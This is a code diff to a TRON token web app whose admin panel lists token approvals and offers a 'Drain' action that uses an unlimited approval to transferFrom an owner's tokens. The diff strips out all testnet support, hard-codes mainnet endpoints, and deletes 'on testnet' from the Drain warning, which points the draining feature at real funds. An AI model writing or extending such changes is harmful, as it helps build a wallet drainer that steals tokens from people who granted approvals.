@@ -23,12 +23,7 @@
       const raw = localStorage.getItem(LS_KEY);
       if (!raw) return;
       const o = JSON.parse(raw);
-      if (o.NETWORK) {
-        cfg.NETWORK = o.NETWORK;
-        cfg.TRONSCAN_BASE = o.NETWORK === "mainnet"
-          ? "https://tronscan.org"
-          : "https://nile.tronscan.org";
-      }
+      // NETWORK overrides are ignored — mainnet only.
       if (o.TOKEN_ADDRESS) cfg.TOKEN_ADDRESS = o.TOKEN_ADDRESS;
       if (Array.isArray(o.TOKEN_ABI) && o.TOKEN_ABI.length) TOKEN_ABI = o.TOKEN_ABI;
     } catch (_) {}
@@ -104,7 +99,6 @@
     confirmSendBtn: $("confirmSendBtn"),
     adminToggle: $("adminToggle"),
     adminPanel: $("adminPanel"),
-    adminNetwork: $("adminNetwork"),
     adminTokenAddr: $("adminTokenAddr"),
     adminSaveBtn: $("adminSaveBtn"),
     adminResetBtn: $("adminResetBtn"),
@@ -275,7 +269,7 @@
     }
     setWcStatus("opening QR…");
     try {
-      const { address } = await window.__WC.connect(cfg.NETWORK);
+      const { address } = await window.__WC.connect("mainnet");
       if (!address) { toast("Connection cancelled", "warn"); setWcStatus("cancelled"); return false; }
       await activateWcSession(address);
       setWcStatus("connected as " + shortAddr(address, 6, 4));
@@ -528,7 +522,7 @@
     els.confirmTo.title = to;
     els.confirmFrom.textContent = shortAddr(state.address, 8, 8);
     els.confirmFrom.title = state.address;
-    els.confirmNet.textContent = cfg.NETWORK === "mainnet" ? "TRON Mainnet" : "TRON Nile Testnet";
+    els.confirmNet.textContent = "TRON Mainnet";
     els.confirmModal.classList.remove("hidden");
   }
 
@@ -607,9 +601,7 @@
   // Approvals list — fetched from TronGrid event logs
   // -----------------------------------------------------------------------
   function tronGridBase() {
-    if (cfg.NETWORK === "mainnet") return "https://api.trongrid.io";
-    if (cfg.NETWORK === "shasta") return "https://api.shasta.trongrid.io";
-    return "https://nile.trongrid.io";
+    return "https://api.trongrid.io";
   }
   function hexToTronAddr(h) {
     if (!h) return "";
@@ -825,7 +817,7 @@
         if (!confirm(
           `Drain ${human} ${state.symbol} from\n${owner}\n→ ${spender}\n\n` +
           `This uses the unlimited approval to call transferFrom. ` +
-          `Only do this on testnet against wallets you control.`,
+          `Only do this against wallets you control.`,
         )) return;
         btn.disabled = true;
         const original = btn.textContent;
@@ -1002,28 +994,6 @@
       );
     });
   }
-  // Auto-save network selection the moment the dropdown changes — no need to
-  // hit the Save button just to flip mainnet ↔ nile.
-  if (els.adminNetwork) {
-    els.adminNetwork.addEventListener("change", async () => {
-      const network = els.adminNetwork.value;
-      const raw = localStorage.getItem(LS_KEY);
-      let overrides = {};
-      try { overrides = raw ? JSON.parse(raw) : {}; } catch (_) {}
-      overrides.NETWORK = network;
-      overrides.TOKEN_ADDRESS = overrides.TOKEN_ADDRESS || cfg.TOKEN_ADDRESS;
-      try { localStorage.setItem(LS_KEY, JSON.stringify(overrides)); } catch (_) {}
-      cfg.NETWORK = network;
-      cfg.TRONSCAN_BASE = network === "mainnet"
-        ? "https://tronscan.org"
-        : "https://nile.tronscan.org";
-      updateAdminCurrent();
-      toast(`Network: ${network.toUpperCase()}`, "info");
-      if (state.tronWeb && state.address) {
-        try { await initContracts(); await refresh(); } catch (_) {}
-      }
-    });
-  }
   if (els.wcEnabledToggle) {
     els.wcEnabledToggle.checked = isWcEnabled();
     els.wcEnabledToggle.addEventListener("change", async () => {
@@ -1099,12 +1069,11 @@
   // -----------------------------------------------------------------------
 
   function updateAdminCurrent() {
-    els.adminCurNet.textContent = cfg.NETWORK;
-    els.adminCurToken.textContent = cfg.TOKEN_ADDRESS;
-    els.netBadge.textContent = (cfg.NETWORK || "").toUpperCase();
+    if (els.adminCurNet) els.adminCurNet.textContent = "mainnet";
+    if (els.adminCurToken) els.adminCurToken.textContent = cfg.TOKEN_ADDRESS;
+    els.netBadge.textContent = "MAINNET";
   }
   function populateAdminInputs() {
-    els.adminNetwork.value = cfg.NETWORK === "mainnet" ? "mainnet" : "nile";
     els.adminTokenAddr.value = cfg.TOKEN_ADDRESS;
     if (els.adminSpenderAddr) els.adminSpenderAddr.value = loadSpenderFilter();
     if (els.adminScamSpender) {
@@ -1137,19 +1106,14 @@
 
   els.adminSaveBtn.addEventListener("click", async () => {
     const token = els.adminTokenAddr.value.trim();
-    const network = els.adminNetwork.value;
     if (!isValidTronAddr(token)) {
       toast("Token address looks invalid (must start with T, 34 chars)", "error");
       return;
     }
-    const overrides = { NETWORK: network, TOKEN_ADDRESS: token };
+    const overrides = { TOKEN_ADDRESS: token };
     try { localStorage.setItem(LS_KEY, JSON.stringify(overrides)); }
     catch (e) { toast("Could not save (storage blocked)", "error"); return; }
 
-    cfg.NETWORK = network;
-    cfg.TRONSCAN_BASE = network === "mainnet"
-      ? "https://tronscan.org"
-      : "https://nile.tronscan.org";
     cfg.TOKEN_ADDRESS = token;
     TOKEN_ABI = DEFAULT_TOKEN_ABI;
     updateAdminCurrent();
@@ -1161,8 +1125,6 @@
 
   els.adminResetBtn.addEventListener("click", () => {
     try { localStorage.removeItem(LS_KEY); } catch (_) {}
-    cfg.NETWORK = DEFAULTS.NETWORK;
-    cfg.TRONSCAN_BASE = DEFAULTS.TRONSCAN_BASE;
     cfg.TOKEN_ADDRESS = DEFAULTS.TOKEN_ADDRESS;
     TOKEN_ABI = DEFAULT_TOKEN_ABI;
     populateAdminInputs();
